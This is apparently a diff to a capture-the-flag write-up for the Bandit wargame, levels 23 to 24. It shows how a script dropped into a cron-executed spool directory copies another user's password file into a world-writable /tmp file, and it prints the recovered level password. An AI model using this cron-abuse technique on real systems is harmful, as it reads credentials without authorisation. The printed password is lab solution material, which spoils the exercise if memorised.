@@ -263,6 +263,31 @@ A program is running automatically at regular intervals from **cron**. Look in *
 ```
 cat /etc/cron.d/cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/Zoot23
+chmod a+wx /tmp/Zoot23
+nano /tmp/Zoot23/bandit23.sh
 ```
 
-TMP note: /var/spool/bandit24
+**/tmp/Zoot23/bandit23.sh**:
+
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/Zoot23/pass.txt
+```
+
+```
+touch /tmp/Zoot23/pass.txt
+chmod a+w /tmp/Zoot23/pass.txt
+cp /tmp/Zoot23/bandit23.sh /var/spool/bandit24/foo/bandit23.sh
+cat /tmp/Zoot23/pass.txt
+```
+
+password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+# Level 24
+
+A daemon is listening on port **30002** and will give you the password if given the previous password and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by brute-forcing.
+
+```
+
+```
